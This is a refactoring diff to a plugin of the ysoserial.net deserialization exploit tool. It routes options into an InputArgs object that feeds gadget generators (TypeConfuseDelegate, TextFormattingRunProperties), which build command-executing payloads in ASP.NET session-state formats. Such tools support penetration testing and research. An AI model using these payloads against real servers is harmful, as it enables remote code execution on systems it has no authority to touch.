@@ -3,6 +3,7 @@ using NDesk.Options;
 using System;
 using ysoserial.Generators;
 using System.IO;
+using ysoserial.Helpers;
 
 /**
  * Author: Soroush Dalili (@irsdl)
@@ -59,10 +60,15 @@ namespace ysoserial.Plugins
 
         public object Run(string[] args)
         {
+            InputArgs inputArgs = new InputArgs();
             List<string> extra;
             try
             {
                 extra = options.Parse(args);
+                inputArgs.CmdFullString = command;
+                inputArgs.Minify = minify;
+                inputArgs.UseSimpleType = useSimpleType;
+                inputArgs.Test = test;
             }
             catch (OptionException e)
             {
@@ -103,7 +109,7 @@ namespace ysoserial.Plugins
                 // hacky way ends */
 
                 /* here it is using the sane way! */
-                object serializedData = (object)TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(command);
+                object serializedData = (object)TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs);
                 System.Web.SessionState.SessionStateItemCollection items = new System.Web.SessionState.SessionStateItemCollection();
                 items[""] = serializedData;
                 MemoryStream stream = new MemoryStream();
@@ -124,7 +130,7 @@ namespace ysoserial.Plugins
             else
             {
                 // HttpStaticObjectsCollection
-                byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().Generate(command, "BinaryFormatter", false, minify, useSimpleType);
+                byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
                 byte[] newSerializedData = new byte[serializedData.Length + 7]; // ReadInt32 + ReadString + ReadBoolean + ReadByte
                 serializedData.CopyTo(newSerializedData, 7);
                 newSerializedData[0] = 1; // for ReadInt32
